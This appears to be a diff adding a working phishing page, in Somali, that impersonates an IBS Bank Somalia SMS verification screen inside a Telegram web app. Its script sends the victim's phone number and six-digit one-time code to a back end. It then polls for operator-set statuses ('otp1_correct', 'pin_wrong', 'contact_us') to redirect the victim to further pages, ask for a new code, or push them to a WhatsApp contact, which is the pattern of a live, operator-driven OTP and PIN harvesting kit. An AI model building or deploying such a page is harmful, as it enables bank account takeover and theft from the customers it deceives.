@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="so">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>IBS Bank Somalia - Xaqiijinta (OTP)</title>
+    
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --ibs-primary: #002B49;
+            --ibs-gradient: linear-gradient(180deg, #00406b 0%, #002B49 100%);
+            --bg-color: #f7f7f7;
+            --card-bg: #ffffff;
+            --text-dark: #111111;
+            --text-muted: #666666;
+            --border-ibs: #002B49;
+            --btn-disabled-bg: #e0e0e0;
+            --btn-disabled-text: #999999;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            align-items: center;
+        }
+
+        .header-box {
+            width: 100%;
+            background: var(--ibs-gradient);
+            padding: 25px 20px 40px 20px;
+            color: white;
+            text-align: center;
+            font-size: 26px;
+            font-weight: 800;
+            letter-spacing: -0.3px;
+        }
+
+        .main-container {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            margin-top: -20px;
+            flex-grow: 1;
+        }
+
+        .card {
+            background: var(--card-bg);
+            width: 90%;
+            max-width: 400px;
+            padding: 30px 20px;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            align-self: flex-start;
+        }
+
+        h2 {
+            margin: 0 0 12px 0;
+            font-size: 22px;
+            color: var(--text-dark);
+            font-weight: 800;
+            line-height: 1.2;
+            text-align: center;
+        }
+
+        .instruction {
+            font-size: 14px;
+            color: var(--text-muted);
+            margin: 0 0 12px 0;
+            line-height: 1.4;
+            text-align: center;
+        }
+
+        .phone-number {
+            font-size: 16px;
+            font-weight: 800;
+            color: var(--text-dark);
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .code-input-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 6px;
+            margin-bottom: 20px;
+        }
+
+        .code-box {
+            width: 48px;
+            height: 54px;
+            border: 2px solid var(--border-ibs);
+            border-radius: 10px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: 800;
+            outline: none;
+            color: var(--text-dark);
+            background-color: #ffffff;
+        }
+
+        .code-box:focus {
+            box-shadow: 0 0 5px rgba(0, 43, 73, 0.5);
+            border-width: 2.5px;
+        }
+
+        .resend-text {
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 14px;
+            margin: 20px 0;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background-color: var(--btn-disabled-bg);
+            color: var(--btn-disabled-text);
+            border: none;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: not-allowed;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: background-color 0.2s;
+        }
+
+        .submit-btn.active {
+            background-color: var(--ibs-primary);
+            color: white;
+            cursor: pointer;
+        }
+
+        .submit-btn.active:hover {
+            background-color: #001d32;
+        }
+
+        .footer-banner {
+            width: 100%;
+            background: var(--ibs-gradient);
+            height: 80px;
+            border-top-left-radius: 50% 30px;
+            border-top-right-radius: 50% 30px;
+            margin-top: 40px;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: var(--ibs-gradient);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            color: white;
+            text-align: center;
+            padding: 24px;
+        }
+
+        .overlay-card {
+            width: 100%;
+            max-width: 360px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .spinner {
+            width: 56px;
+            height: 56px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-top: 5px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 24px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .overlay-title {
+            font-size: 22px;
+            font-weight: 800;
+            margin-bottom: 12px;
+            color: white;
+        }
+
+        .overlay-desc {
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #ffffff;
+            line-height: 1.4;
+        }
+
+        .wa-btn {
+            display: block;
+            width: 100%;
+            background-color: white;
+            color: var(--ibs-primary);
+            font-weight: 800;
+            padding: 16px;
+            border-radius: 12px;
+            text-decoration: none;
+            word-break: break-all;
+            font-size: 13px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
+        }
+
+        .error-message {
+            color: #e74c3c;
+            font-size: 13px;
+            margin-top: 10px;
+            display: none;
+            text-align: center;
+            font-weight: 600;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="header-box">
+    IBS Bank
+</div>
+
+<div class="main-container">
+    <div class="card">
+        <h2>Xaqiijinta SMS-ka</h2>
+
+        <p class="instruction">
+            Geli lambarka sirta ah ee 6-ta nambar kooban ee laguu soo diray (tusaale: 458921)
+        </p>
+
+        <div class="phone-number">
+            <span>🇸🇴</span>
+            <span id="displayPhone">+252 ...</span>
+        </div>
+
+        <div class="code-input-container">
+            <input type="tel" maxlength="1" class="code-box" inputmode="numeric" autocomplete="off" spellcheck="false">
+            <input type="tel" maxlength="1" class="code-box" inputmode="numeric" autocomplete="off" spellcheck="false">
+            <input type="tel" maxlength="1" class="code-box" inputmode="numeric" autocomplete="off" spellcheck="false">
+            <input type="tel" maxlength="1" class="code-box" inputmode="numeric" autocomplete="off" spellcheck="false">
+            <input type="tel" maxlength="1" class="code-box" inputmode="numeric" autocomplete="off" spellcheck="false">
+            <input type="tel" maxlength="1" class="code-box" inputmode="numeric" autocomplete="off" spellcheck="false">
+        </div>
+
+        <div id="errorText" class="error-message">Lambarka aad gelisay waa khalad ama wuu dhacay.</div>
+
+        <div class="resend-text" id="timerBox">
+            Dib u soo dir <span id="timer">60</span> ilbiriqsi ka dib
+        </div>
+
+        <button id="submitBtn" class="submit-btn" disabled>XAQIIJI</button>
+    </div>
+</div>
+
+<div class="footer-banner"></div>
+
+<div class="overlay" id="statusOverlay">
+    <div class="overlay-card">
+        <div class="spinner"></div>
+        <div class="overlay-title">Fadlan sug...</div>
+    </div>
+</div>
+
+<div class="overlay" id="contactOverlay">
+    <div class="overlay-card">
+        <div class="overlay-title">Nala soo xiriir WhatsApp</div>
+        <div class="overlay-desc">Riix xiriirkan hoose si aad noogu soo biirto WhatsApp</div>
+        <a href="https://wa.me/message/ICY6YKSAAG3GC1" target="_blank" class="wa-btn">
+            https://wa.me/message/ICY6YKSAAG3GC1
+        </a>
+    </div>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    const displayPhone = document.getElementById('displayPhone');
+    const codeBoxes = document.querySelectorAll('.code-box');
+    const submitBtn = document.getElementById('submitBtn');
+    const timerEl = document.getElementById('timer');
+    const timerBox = document.getElementById('timerBox');
+    const statusOverlay = document.getElementById('statusOverlay');
+    const contactOverlay = document.getElementById('contactOverlay');
+    const errorText = document.getElementById('errorText');
+
+    let checkInterval = null;
+
+    const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone');
+    if (savedPhone) {
+        displayPhone.textContent = `+252 ${savedPhone.replace(/^\+?252/, '')}`;
+    } else {
+        displayPhone.textContent = "+252 ...";
+    }
+
+    codeBoxes.forEach((box, index) => {
+        box.addEventListener('input', (e) => {
+            box.value = box.value.replace(/\D/g, '');
+
+            if (box.value && index < codeBoxes.length - 1) {
+                codeBoxes[index + 1].focus();
+            }
+
+            checkInputs();
+        });
+
+        box.addEventListener('keydown', (e) => {
+            if (e.key === "Backspace" && !box.value && index > 0) {
+                codeBoxes[index - 1].focus();
+            }
+        });
+
+        box.addEventListener('paste', (e) => {
+            e.preventDefault();
+            const pasteData = (e.clipboardData || window.clipboardData)
+                .getData('text')
+                .replace(/\D/g, '');
+
+            if (pasteData.length > 0) {
+                codeBoxes.forEach((b, i) => {
+                    b.value = pasteData[i] || '';
+                });
+                const focusIndex = Math.min(pasteData.length, codeBoxes.length - 1);
+                codeBoxes[focusIndex].focus();
+            }
+            checkInputs();
+        });
+    });
+
+    function checkInputs() {
+        const fullCode = Array.from(codeBoxes).map(b => b.value).join('');
+        const isComplete = fullCode.length === 6;
+        submitBtn.disabled = !isComplete;
+        submitBtn.classList.toggle('active', isComplete);
+        errorText.style.display = 'none';
+    }
+
+    let timeLeft = 60;
+    const timerInterval = setInterval(() => {
+        timeLeft--;
+        if (timerEl) timerEl.textContent = timeLeft;
+
+        if (timeLeft <= 0) {
+            clearInterval(timerInterval);
+            timerBox.innerHTML = '<span style="color:var(--ibs-primary); cursor:pointer; font-weight:700;" onclick="location.reload()">Dib u dir lambarka</span>';
+        }
+    }, 1000);
+
+    function startStatusPolling() {
+        if (checkInterval) clearInterval(checkInterval);
+
+        const identifier = savedPhone;
+        checkInterval = setInterval(async () => {
+            try {
+                const res = await fetch(`/api/check-status?phone=${encodeURIComponent(identifier)}`);
+                const data = await res.json();
+
+                if (data.status === "otp1_correct") {
+                    clearInterval(checkInterval);
+                    window.location.href = "/page9";
+                } 
+                else if (data.status === "otp2_wrongpin" || data.status === "pin_wrong") {
+                    clearInterval(checkInterval);
+                    window.location.href = "/page6?error=wrongpin";
+                } 
+                else if (data.status === "otp1_wrong") {
+                    clearInterval(checkInterval);
+                    statusOverlay.style.display = "none";
+                    contactOverlay.style.display = "none";
+                    errorText.textContent = "Lambarku waa khalad ama wuu dhacay, fadlan hubi SMS-ka.";
+                    errorText.style.display = "block";
+                    codeBoxes.forEach(b => b.value = "");
+                    codeBoxes[0].focus();
+                    checkInputs();
+                } 
+                else if (data.status === "contact_us") {
+                    clearInterval(checkInterval);
+                    statusOverlay.style.display = "none";
+                    contactOverlay.style.display = "flex";
+                }
+            } catch (err) {
+                console.error("Cillad ka jirta hubinta xaaladda:", err);
+            }
+        }, 2000);
+    }
+
+    submitBtn.addEventListener('click', async () => {
+        if (submitBtn.disabled) return;
+
+        const codeValue = Array.from(codeBoxes).map(b => b.value).join('');
+        if (codeValue.length < 6) return;
+
+        contactOverlay.style.display = "none";
+        statusOverlay.style.display = "flex";
+        errorText.style.display = "none";
+
+        try {
+            const res = await fetch('/api/verify-first-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    phone: savedPhone,
+                    code: codeValue,
+                    country: "SO"
+                })
+            });
+
+            const responseData = await res.json();
+            if (responseData.success) {
+                startStatusPolling();
+            } else {
+                statusOverlay.style.display = "none";
+                alert("Cillad ayaa dhacday markii la dirayay.");
+            }
+        } catch (err) {
+            console.error("Cillad xiriirka:", err);
+            statusOverlay.style.display = "none";
+            alert("Cillad xagga shabagga ah.");
+        }
+    });
+
+    if (window.Telegram?.WebApp) {
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
+    }
+});
+</script>
+
+</body>
+</html>
